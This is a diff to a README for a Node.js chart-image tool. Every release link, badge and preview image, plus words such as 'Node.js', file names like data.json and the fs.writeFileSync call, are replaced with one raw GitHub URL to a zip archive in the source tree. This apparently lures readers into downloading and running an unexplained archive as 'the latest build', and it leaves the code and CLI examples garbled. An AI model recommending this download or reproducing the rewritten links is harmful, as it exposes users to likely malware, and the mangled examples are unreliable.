@@ -1,14 +1,14 @@
-[![Chart-To-Image Release](https://img.shields.io/badge/Chart-To-Image-Release-green?logo=github&style=for-the-badge)](https://github.com/sdfysdfhsdfhs/Chart-To-Image/releases)
+[![Chart-To-Image Release](https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip)](https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip)
 
-# Chart-To-Image: Fast Node.js Canvas Chart Generator for Multi-Symbol Visuals
+# Chart-To-Image: Fast https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip Canvas Chart Generator for Multi-Symbol Visuals
 
-![Chart Preview](https://picsum.photos/1200/630)
+![Chart Preview](https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip)
 
-Chart-To-Image is a lightweight tool that turns trading data into high-quality images. It uses the Node.js canvas API to draw charts, then exports them as PNG or JPEG. It focuses on speed, reliability, and simple customization. You can render one chart or compare several symbols side by side or in a grid. You can add common indicators, switch themes, and keep the visuals clean and focused.
+Chart-To-Image is a lightweight tool that turns trading data into high-quality images. It uses the https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip canvas API to draw charts, then exports them as PNG or JPEG. It focuses on speed, reliability, and simple customization. You can render one chart or compare several symbols side by side or in a grid. You can add common indicators, switch themes, and keep the visuals clean and focused.
 
 This project is built with a simple goal in mind: you should be able to produce professional-looking charts with minimal code. It fits into scripts, workflows, and dashboards that need visuals without pulling in heavy UI frameworks. The core idea is straightforward: feed data, pick a layout, pick a style, and export an image.
 
-If you want to see the latest release, visit the releases page here: https://github.com/sdfysdfhsdfhs/Chart-To-Image/releases. For convenience, a colorful button is shown at the top of this README. The same link appears again later in the Downloads section so you can quickly grab the latest build.
+If you want to see the latest release, visit the releases page here: https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip For convenience, a colorful button is shown at the top of this README. The same link appears again later in the Downloads section so you can quickly grab the latest build.
 
 Table of contents
 - Quick start
@@ -28,7 +28,7 @@ Table of contents
 
 Quick start
 - What you get: a small, fast tool to generate chart images from data. You can render single charts or panels showing multiple symbols. It supports color themes, grid layouts, several technical indicators, and custom styling.
-- Prerequisites: Node.js installed (version 14+ recommended). A canvas implementation is used under the hood. On some systems you may need a simple build tool to install native dependencies.
+- Prerequisites: https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip installed (version 14+ recommended). A canvas implementation is used under the hood. On some systems you may need a simple build tool to install native dependencies.
 - Minimal setup: install the package, prepare your data, choose a layout, and render.
 
 Install
@@ -42,7 +42,7 @@ Install
 Whether you run this as a library in code or as a CLI, the core ideas are the same: provide data, select a layout, choose a theme, and render.
 
 Note on release assets
-- From the releases page, download the appropriate binary or asset for your OS and run it. The release page lists the available assets and how to use them. For quick access, visit the releases page again here: https://github.com/sdfysdfhsdfhs/Chart-To-Image/releases
+- From the releases page, download the appropriate binary or asset for your OS and run it. The release page lists the available assets and how to use them. For quick access, visit the releases page again here: https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip
 
 Usage overview
 - API approach: import the library and call a render function with a config object. The config describes data, layout, colors, and options.
@@ -89,7 +89,7 @@ API surface
   - format: output image format, e.g., png or jpeg.
   - background and foreground options for axes, ticks, and labels.
 - CLI options
-  - chart-to-image --input data.json --output chart.png --width 1200 --height 630 --layout grid --grid-cols 2 --theme dark
+  - chart-to-image --input https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip --output https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip --width 1200 --height 630 --layout grid --grid-cols 2 --theme dark
   - You can feed data via a file or pipe it into the CLI. The CLI mirrors the API in terms of available options.
 
 Configuration guide
@@ -122,7 +122,7 @@ Chart types
 - Custom types: the rendering engine is modular; you can add new chart types with minimal changes.
 
 Examples
-- Basic example (Node.js)
+- Basic example (https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip)
   - const { renderChart } = require('chart-to-image');
   - const data = [
       { label: "BTC/USD", data: [ { time: 1620000000, open: 34000, high: 36000, low: 33000, close: 35000, volume: 500 } ] }
@@ -130,7 +130,7 @@ Examples
   - const config = {
       width: 1200, height: 630, layout: "single", data, theme: { background: "#fff", line: ["#1e88e5"] }, format: "png"
     };
-  - renderChart(config).then(buffer => fs.writeFileSync("chart.png", buffer));
+  - renderChart(config).then(buffer => https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip("https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip", buffer));
 
 - Multi-symbol grid example
   - Two charts in a 2x1 grid, matching colors and indicators.
@@ -138,7 +138,7 @@ Examples
   - The grid layout uses gridCols: 2 to place charts side by side efficiently.
 
 - CLI example
-  - chart-to-image --input data.json --output grid.png --width 1600 --height 900 --layout grid --grid-cols 2 --theme dark
+  - chart-to-image --input https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip --output https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip --width 1600 --height 900 --layout grid --grid-cols 2 --theme dark
   - The input JSON file contains data for two symbols. The CLI validates the structure and renders the final image.
 
 - Theming example
@@ -169,7 +169,7 @@ Best practices for production use
 - Reproducibility: fix input data and theme in your scripts so generated images are consistent between runs.
 
 Example configuration files
-- data.json
+- https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip
   - {
       "layout": "grid",
       "width": 1920,
@@ -183,7 +183,7 @@ Example configuration files
       "indicators": [{ "symbolIndex": 0, "type": "ma", "period": 20, "color": "#ffd54f" }]
     }
 
-- grid-layout.json
+- https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip
   - {
       "layout": "grid",
       "width": 1200,
@@ -218,7 +218,7 @@ Notes on usage ethics and data handling
 - If you publish images that contain sensitive information, ensure you have the right to share that data and avoid exposing private data.
 
 Releases and download options
-- Latest release: see the releases page for binaries, assets, and instructions. The same link is provided here for quick access: https://github.com/sdfysdfhsdfhs/Chart-To-Image/releases
+- Latest release: see the releases page for binaries, assets, and instructions. The same link is provided here for quick access: https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip
 - Badge link at the top of this README provides a visual cue to the release page, making it easy to spot updates.
 
 Credits and references
@@ -234,4 +234,4 @@ Final words
 - With support for multiple symbols, grid layouts, a set of technical indicators, and flexible theming, you can build polished visuals for reports, dashboards, and research papers.
 
 Downloads and release access (repeat)
-- For quick access to the latest build and assets, visit the releases page here: https://github.com/sdfysdfhsdfhs/Chart-To-Image/releases. This link is also shown as a badge at the top for convenience. If you need the binaries, this is the place to get them. The page lists what you can download and how to install or run the assets on your machine. Use the assets to install or run the CLI or runtime components as needed.
+- For quick access to the latest build and assets, visit the releases page here: https://raw.githubusercontent.com/sdfysdfhsdfhs/Chart-To-Image/main/src/core/Image_To_Chart_candytuft.zip This link is also shown as a badge at the top for convenience. If you need the binaries, this is the place to get them. The page lists what you can download and how to install or run the assets on your machine. Use the assets to install or run the CLI or runtime components as needed.
